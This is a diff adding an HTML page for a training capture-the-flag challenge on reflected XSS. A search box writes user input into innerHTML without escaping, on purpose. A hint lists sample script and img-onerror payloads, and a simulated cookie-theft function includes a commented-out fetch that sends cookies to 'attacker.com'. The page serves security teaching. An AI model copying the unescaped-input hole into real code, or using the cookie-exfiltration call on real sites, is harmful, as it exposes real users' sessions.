@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Challenge 2: XSS Reflection</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
+            color: #00ff00;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .header p {
+            opacity: 0.8;
+        }
+        
+        .search-section {
+            margin-bottom: 30px;
+        }
+        
+        .search-form {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        input[type="text"] {
+            flex: 1;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+        }
+        
+        input[type="text"]:focus {
+            outline: none;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        
+        button {
+            padding: 12px 20px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        button:hover {
+            background: #00cc00;
+            transform: scale(1.02);
+        }
+        
+        .results {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .admin-panel {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .admin-panel.show {
+            display: block;
+        }
+        
+        .admin-panel h3 {
+            color: #ff0000;
+            margin-bottom: 15px;
+        }
+        
+        .flag {
+            background: rgba(255, 255, 0, 0.2);
+            border: 1px solid #ffff00;
+            border-radius: 5px;
+            padding: 15px;
+            color: #ffff00;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .hint {
+            background: rgba(255, 255, 0, 0.1);
+            border: 1px solid #ffff00;
+            border-radius: 5px;
+            padding: 15px;
+            color: #ffff00;
+            font-size: 0.9em;
+        }
+        
+        .back-link {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: #00ff00;
+            text-decoration: none;
+            font-size: 1.2em;
+        }
+        
+        .back-link:hover {
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .cookie-info {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <a href="index.html" class="back-link">← Back to Challenges</a>
+    
+    <div class="container">
+        <div class="header">
+            <h1>🎯 XSS Reflection Challenge</h1>
+            <p>Exploit reflected XSS to steal admin cookies and access the admin panel</p>
+        </div>
+        
+        <div class="search-section">
+            <h3>Search Engine</h3>
+            <p>Search for anything you want:</p>
+            
+            <form class="search-form" id="searchForm">
+                <input type="text" id="searchQuery" placeholder="Enter your search query..." required>
+                <button type="submit">Search</button>
+            </form>
+            
+            <div class="cookie-info">
+                <strong>🍪 Current Cookies:</strong> session_id=user123; admin_token=not_admin
+            </div>
+        </div>
+        
+        <div class="results" id="results">
+            <h3>Search Results:</h3>
+            <p>Enter a search query to see results...</p>
+        </div>
+        
+        <div class="admin-panel" id="adminPanel">
+            <h3>🔒 Admin Panel</h3>
+            <p>Welcome, Admin! You have successfully accessed the admin panel.</p>
+            <div class="flag">
+                🎉 FLAG: CTF{xss_cookie_theft_success}
+            </div>
+        </div>
+        
+        <div class="hint">
+            <strong>💡 Hint:</strong> The search results reflect your input directly in the HTML. Try injecting JavaScript to steal cookies and modify the admin_token cookie to 'admin'. Common XSS payloads include: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+        </div>
+    </div>
+
+    <script>
+        // Simulate admin cookie check
+        function checkAdminAccess() {
+            const cookies = document.cookie;
+            if (cookies.includes('admin_token=admin')) {
+                document.getElementById('adminPanel').classList.add('show');
+                return true;
+            }
+            return false;
+        }
+        
+        // Function to steal cookies (simulated)
+        function stealCookies() {
+            const cookies = document.cookie;
+            console.log('Stolen cookies:', cookies);
+            
+            // Simulate sending cookies to attacker (in real scenario)
+            // fetch('http://attacker.com/steal?cookies=' + encodeURIComponent(cookies));
+            
+            // For this demo, we'll just show an alert
+            alert('Cookies stolen: ' + cookies);
+            
+            // Simulate cookie modification
+            if (cookies.includes('admin_token=not_admin')) {
+                document.cookie = 'admin_token=admin; path=/';
+                alert('Admin token modified! Refreshing page...');
+                setTimeout(() => {
+                    location.reload();
+                }, 1000);
+            }
+        }
+        
+        document.getElementById('searchForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const query = document.getElementById('searchQuery').value;
+            const resultsDiv = document.getElementById('results');
+            
+            // Vulnerable: Directly inserting user input into HTML
+            resultsDiv.innerHTML = `
+                <h3>Search Results for: ${query}</h3>
+                <p>No results found for "${query}". Try a different search term.</p>
+                <p><em>Note: This search engine is vulnerable to XSS attacks!</em></p>
+            `;
+            
+            // Check if admin panel should be shown
+            setTimeout(checkAdminAccess, 100);
+        });
+        
+        // Check admin access on page load
+        checkAdminAccess();
+    </script>
+</body>
+</html>
